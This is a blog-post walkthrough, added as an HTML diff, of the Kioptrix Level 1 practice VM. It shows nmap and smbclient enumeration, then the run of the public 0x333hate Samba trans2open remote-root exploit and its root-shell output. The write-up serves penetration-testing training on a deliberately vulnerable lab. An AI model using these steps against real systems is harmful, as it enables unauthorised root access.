@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Kioptrix Level 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2013-01-20">January 20, 2013</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/kioptrix">kioptrix</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Kioptrix Level 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This is a walkthrough of how I completed Kioptrix Level 1.  The goal is to obtain the flag.</p>
+
+<h2 id="nmap:89aaf23838ef9c8ff34cb30ba3b2c2a1">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -A -p- 192.168.1.123
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+|_sshv1: Server supports SSHv1
+80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+111/tcp   open  rpcbind     2 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1          32768/tcp  status
+|_  100024  1          32770/udp  status
+139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp   open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-09-26T08:32:06+00:00
+|_Not valid after:  2010-09-26T08:32:06+00:00
+|_ssl-date: 2014-04-23T23:02:40+00:00; +3h59m59s from local time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+32768/tcp open  status      1 (RPC #100024)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1          32768/tcp  status
+|_  100024  1          32770/udp  status
+</code></pre>
+
+<h2 id="smbclient:89aaf23838ef9c8ff34cb30ba3b2c2a1">SMBClient</h2>
+
+<p>The nmap scan showed that the Samba service was running, I used SMBClient to establish a NULL session.  This allowed me to see the available shares and the Samba version (2.2.1a).</p>
+
+<pre><code class="language-text">root@kali:~# smbclient -L \\192.168.1.123 -N
+
+Anonymous login successful
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+     Sharename       Type      Comment
+     ---------       ----      -------
+     IPC$            IPC       IPC Service (Samba Server)
+     ADMIN$          IPC       IPC Service (Samba Server)
+Anonymous login successful
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+     Server               Comment
+     ---------            -------
+     KIOPTRIX             Samba Server
+     Workgroup            Master
+     ---------            -------
+</code></pre>
+
+<p>This is vulnerable to a buffer overflow in the <code>call_trans2open</code> function in <code>trans2.c</code>, for which there are many exploits available.  Some are more reliable others however.</p>
+
+<h2 id="0x333hate:89aaf23838ef9c8ff34cb30ba3b2c2a1">0x333hate</h2>
+
+<p>The exploit which worked well for me was the <code>0x333hate</code> varient, downloaded from SecurityFocus.  After compiling and running the exploit, I was granted with a root shell.</p>
+
+<pre><code class="language-text">root@kali:~/kioptrix/1# ./0x333hate -t 192.168.1.123
+ [~] 0x333hate =&gt; samba 2.2.x remote root exploit [~]
+ [~]        coded by c0wboy ~ www.0x333.org       [~]
+ [-] connecting to 192.168.1.123:139
+ [-] stating bruteforce
+ [-] testing 0xbfffffff
+ [-] testing 0xbffffdff
+ [-] testing 0xbffffbff
+ [-] testing 0xbffff9ff
+ [-] testing 0xbffff7ff
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
+</code></pre>
+
+<h2 id="flag:89aaf23838ef9c8ff34cb30ba3b2c2a1">Flag</h2>
+
+<p>After searching through the system, I eventually found the flag in <code>/var/spool/mail</code>.</p>
+
+<pre><code class="language-text">If you are reading this, you got root. Congratulations.
+Level 2 won't be as easy...
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2013  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
